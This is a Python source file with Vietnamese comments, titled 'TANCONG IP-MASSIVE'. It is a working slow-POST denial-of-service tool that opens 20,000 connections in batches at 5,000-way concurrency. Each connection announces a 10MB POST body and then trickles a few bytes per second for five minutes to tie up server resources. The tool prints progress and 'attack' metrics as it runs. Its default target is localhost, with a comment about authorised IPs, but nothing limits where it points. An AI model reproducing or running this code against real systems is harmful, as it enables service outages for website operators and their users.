#!/usr/bin/env python3
"""
TANCONG IP-MASSIVE - 20,000+ Connections Attack
===============================================

Tối ưu hóa cho tấn công quy mô lớn (20,000+ connections):
- Batch spawning - tạo hàng trăm connections đồng thời
- Aggressive concurrency - 5000 parallel tasks
- Zero-delay batches - không stagger trong batch
- Memory efficient - không lưu tất cả tasks

Key optimizations cho massive scale:
1. Batch Spawn - Tạo 100-200 connections cùng lúc, không stagger
2. High Concurrency - Semaphore 5000 (50x higher)
3. Streaming Tasks - Không lưu tất cả 20k tasks trong memory
4. Connection Reuse - 3-5 requests per TCP để giảm connection count
5. Progress Monitoring - Báo cáo mỗi 1000 connections

⚠️ Yêu cầu hệ thống:
- Linux: ulimit -n 65536 (tăng file descriptor limit)
- RAM: ~2-4GB cho 20k connections
- CPU: Multi-core recommended
"""

import asyncio
import ssl
import random
import time
import socket
import signal
import sys
import gc
from dataclasses import dataclass, field
from typing import List, Dict, Optional
from enum import Enum

# =============================================================================
# CONFIGURATION FOR MASSIVE ATTACK
# =============================================================================

class AttackMode(Enum):
    PIPELINE = "pipeline"        # Gửi nhiều requests/connection
    RAPID_CONNECT = "rapid"    # Mở nhiều connections nhanh


@dataclass
class MassiveAttackConfig:
    """
    Cấu hình tấn công quy mô lớn (20,000+ connections).
    
    Tối ưu cho speed và memory efficiency.
    """
    # Target
    ip: str
    port: int = 80
    path: str = "/"
    use_ssl: bool = False
    hostname: Optional[str] = None
    
    # MASSIVE Scale
    max_connections: int = 20000    # 20,000 connections
    duration: int = 300               # 5 phút per connection
    
    # Batch spawning (KEY OPTIMIZATION!)
    batch_size: int = 100             # 100 connections/batch
    batch_delay: float = 0.1          # 0.1s giữa các batch
    
    # High concurrency
    max_concurrent: int = 5000        # 5000 parallel tasks
    
    # Connection reuse (giảm số TCP thực tế)
    requests_per_conn: int = 3        # 3 requests per TCP
    
    # Payload
    post_content_length: int = 10000000  # 10MB
    chunk_size: int = 10
    chunk_interval: float = 1.0
    
    def effective_requests(self) -> int:
        """Tổng số effective attack requests."""
        return self.max_connections * self.requests_per_conn


# =============================================================================
# METRICS FOR MASSIVE SCALE
# =============================================================================

@dataclass 
class MassiveMetrics:
    start_time: float = field(default_factory=time.time)
    total_attempts: int = 0
    successful_attacks: int = 0
    active_connections: int = 0
    tcp_established: int = 0
    bytes_sent: int = 0
    errors: int = 0
    batches_completed: int = 0
    
    def display(self):
        elapsed = time.time() - self.start_time
        rate = self.successful_attacks / max(self.total_attempts, 1) * 100
        
        print(f"\n{'='*70}")
        print(f"🔥 MASSIVE ATTACK METRICS")
        print(f"{'='*70}")
        print(f"⏱️  Time: {elapsed:.1f}s ({elapsed/60:.1f}m)")
        print(f"📊 Total: {self.total_attempts:,} | Success: {self.successful_attacks:,}")
        print(f"🌐 TCP: {self.tcp_established:,} | Active: {self.active_connections}")
        print(f"📦 Batches: {self.batches_completed} | Bytes: {self.bytes_sent:,}")
        print(f"📈 Success Rate: {rate:.1f}%")
        
        # Tốc độ
        if elapsed > 0:
            conn_per_sec = self.total_attempts / elapsed
            print(f"⚡ Speed: {conn_per_sec:.1f} conn/sec")
        
        print(f"{'='*70}\n")
    
    def display_compact(self):
        """Compact display cho progress updates."""
        print(f"[{self.batches_completed} batches] {self.total_attempts:,} conn | "
              f"{self.successful_attacks:,} OK | Active: {self.active_connections}")


METRICS = MassiveMetrics()
SHUTDOWN = asyncio.Event()


# =============================================================================
# MASSIVE ATTACKER
# =============================================================================

class MassiveAttacker:
    """
    Attacker tối ưu cho 20,000+ connections.
    
    Key features:
    - Batch spawning (100 conn/batch, 0 delay trong batch)
    - High concurrency (5000 semaphore)
    - Streaming (không lưu tất cả tasks)
    - Memory efficient
    """
    
    def __init__(self, config: MassiveAttackConfig):
        self.config = config
        self.ssl_ctx = self._create_ssl() if config.use_ssl else None
        # HIGH CONCURRENCY - 5000 parallel
        self.semaphore = asyncio.Semaphore(config.max_concurrent)
    
    def _create_ssl(self) -> ssl.SSLContext:
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        return ctx
    
    async def attack_pipeline(self, conn_id: int) -> bool:
        """
        PIPELINE attack - Gửi nhiều requests trên 1 TCP.
        """
        success_count = 0
        
        try:
            async with self.semaphore:
                # 1 TCP connection
                reader, writer = await asyncio.wait_for(
                    asyncio.open_connection(
                        self.config.ip,
                        self.config.port,
                        ssl=self.ssl_ctx
                    ),
                    timeout=10
                )
                
                METRICS.tcp_established += 1
                METRICS.active_connections += 1
                host = self.config.hostname or self.config.ip
                
                # Gửi nhiều requests
                for req_idx in range(self.config.requests_per_conn):
                    if SHUTDOWN.is_set():
                        break
                    
                    if await self._send_slow_post(reader, writer, conn_id, req_idx, host):
                        success_count += 1
                        METRICS.successful_attacks += 1
                    
                    if req_idx < self.config.requests_per_conn - 1:
                        await asyncio.sleep(0.1)  # Small delay
                
                METRICS.active_connections -= 1
                writer.close()
                try:
                    await writer.wait_closed()
                except:
                    pass
                    
        except Exception as e:
            METRICS.errors += 1
            METRICS.active_connections = max(0, METRICS.active_connections - 1)
        
        return success_count > 0
    
    async def _send_slow_post(self, reader, writer, conn_id: int, req_idx: int, host: str) -> bool:
        """Gửi 1 slow POST."""
        try:
            headers = (
                f"POST {self.config.path} HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                f"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\r\n"
                f"Content-Type: application/x-www-form-urlencoded\r\n"
                f"Content-Length: {self.config.post_content_length}\r\n"
                f"Connection: keep-alive\r\n"
                f"\r\n"
            ).encode()
            
            writer.write(headers)
            METRICS.bytes_sent += len(headers)
            await writer.drain()
            
            # Gửi body từng chunk
            bytes_sent = 0
            start_time = time.time()
            
            while (time.time() - start_time < self.config.duration and
                   bytes_sent < self.config.post_content_length and
                   not SHUTDOWN.is_set()):
                
                chunk = b"X" * self.config.chunk_size
                writer.write(chunk)
                METRICS.bytes_sent += len(chunk)
                bytes_sent += len(chunk)
                await writer.drain()
                await asyncio.sleep(self.config.chunk_interval)
            
            return True
            
        except:
            return False
    
    async def run_batch(self, batch_id: int, start_id: int, end_id: int) -> int:
        """
        Chạy 1 batch - tạo nhiều connections đồng thời.
        
        KEY: Không có stagger trong batch, tất cả spawn cùng lúc!
        """
        batch_size = end_id - start_id
        
        # Tạo tất cả tasks CÙNG LÚC (zero stagger trong batch)
        tasks = [
            asyncio.create_task(self.attack_pipeline(i))
            for i in range(start_id, end_id)
        ]
        
        METRICS.total_attempts += batch_size
        
        # Đợi batch hoàn thành
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        # Đếm success
        success = sum(1 for r in results if r is True)
        
        METRICS.batches_completed += 1
        
        # Hiển thị progress mỗi 10 batch
        if METRICS.batches_completed % 10 == 0:
            METRICS.display_compact()
        
        return success
    
    async def run_massive_attack(self):
        """
        Chạy massive attack với batch spawning.
        
        Thay vì tạo 20k connections tuần tự (mất 66 phút),
        ta tạo từng batch 100 connections cùng lúc.
        """
        total = self.config.max_connections
        batch = self.config.batch_size
        num_batches = (total + batch - 1) // batch  # Ceiling division
        
        print(f"\n🚀 MASSIVE ATTACK CONFIGURATION")
        print(f"{'='*70}")
        print(f"🎯 Target: {self.config.ip}:{self.config.port}{self.config.path}")
        print(f"📊 Total Connections: {total:,}")
        print(f"📦 Batch Size: {batch} (zero stagger within batch)")
        print(f"🌊 Total Batches: {num_batches}")
        print(f"⏱️  Batch Delay: {self.config.batch_delay}s")
        print(f"⚡ Max Concurrent: {self.config.max_concurrent}")
        print(f"🔄 Requests per TCP: {self.config.requests_per_conn}")
        print(f"📈 Effective Attacks: {self.config.effective_requests():,}")
        print(f"{'='*70}\n")
        
        # Kiểm tra ulimit
        print("⚠️  Pre-flight checks:")
        print(f"   Suggested: ulimit -n 65536")
        print(f"   Current soft limit: Check with 'ulimit -n'")
        print()
        
        start_time = time.time()
        total_success = 0
        
        for batch_id in range(num_batches):
            if SHUTDOWN.is_set():
                break
            
            start_id = batch_id * batch + 1
            end_id = min(start_id + batch, total + 1)
            
            # Chạy batch
            success = await self.run_batch(batch_id, start_id, end_id)
            total_success += success
            
            # Progress mỗi 1000 connections
            current_total = (batch_id + 1) * batch
            if current_total % 1000 == 0:
                elapsed = time.time() - start_time
                speed = current_total / elapsed if elapsed > 0 else 0
                eta = (total - current_total) / speed if speed > 0 else 0
                print(f"📊 Progress: {current_total:,}/{total:,} "
                      f"({100*current_total/total:.1f}%) | "
                      f"Speed: {speed:.0f} conn/s | ETA: {eta/60:.1f}m")
            
            # Delay giữa các batch (KHÔNG phải stagger từng connection)
            if batch_id < num_batches - 1:
                await asyncio.sleep(self.config.batch_delay)
            
            # GC mỗi 50 batches để tránh memory bloat
            if batch_id % 50 == 0 and batch_id > 0:
                gc.collect()
        
        elapsed = time.time() - start_time
        print(f"\n✅ Attack Complete!")
        print(f"   Total time: {elapsed/60:.1f} minutes")
        print(f"   Average speed: {total/elapsed:.1f} conn/sec")
        print(f"   Effective attacks: {total_success * self.config.requests_per_conn:,}")


# =============================================================================
# MAIN
# =============================================================================

async def metrics_reporter():
    """Báo cáo metrics mỗi 30 giây."""
    while not SHUTDOWN.is_set():
        await asyncio.sleep(30)
        if not SHUTDOWN.is_set():
            METRICS.display()


def signal_handler():
    SHUTDOWN.set()
    print("\n\n⚠️  Stopping attack (graceful shutdown)...")


async def main():
    print("""
    ╔════════════════════════════════════════════════════════════════╗
    ║        TANCONG IP-MASSIVE - 20,000+ Connections               ║
    ║                                                                  ║
    ║  ⚡ Batch Spawn: 100 connections / 0.1s                     ║
    ║  🌊 High Concurrency: 5000 parallel tasks                      ║
    ║  📈 Scale: 20,000+ connections                                 ║
    ║  🔄 Pipeline: 3 requests per TCP (60k effective)               ║
    ╚════════════════════════════════════════════════════════════════╝
    """)
    
    # Setup signals
    for sig in (signal.SIGINT, signal.SIGTERM):
        asyncio.get_event_loop().add_signal_handler(sig, signal_handler)
    
    # ⚠️ CẤU HÌNH - Tối ưu cho 20,000 connections
    config = MassiveAttackConfig(
        ip="127.0.0.1",              # ← Sửa thành IP được cấp quyền
        port=8000,
        path="/",
        use_ssl=False,
        hostname=None,
        
        # MASSIVE SCALE
        max_connections=20000,        # 20,000 connections
        duration=300,
        
        # BATCH SPAWN (quyết định tốc độ!)
        batch_size=100,               # 100 conn/batch
        batch_delay=0.1,              # 0.1s giữa batches
        
        # HIGH CONCURRENCY
        max_concurrent=5000,          # 5000 tasks song song
        
        # CONNECTION REUSE
        requests_per_conn=3,          # 60k effective requests
    )
    
    # Start metrics reporter
    metrics_task = asyncio.create_task(metrics_reporter())
    
    # Run attack
    attacker = MassiveAttacker(config)
    await attacker.run_massive_attack()
    
    # Final report
    SHUTDOWN.set()
    await asyncio.sleep(0.5)
    METRICS.display()
    
    print("\n🏁 Massive Attack Finished")
    print(f"   Target: {config.ip}:{config.port}")
    print(f"   Connections: {METRICS.total_attempts:,}")
    print(f"   Effective requests: {METRICS.successful_attacks:,}")


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        SHUTDOWN.set()
        METRICS.display()
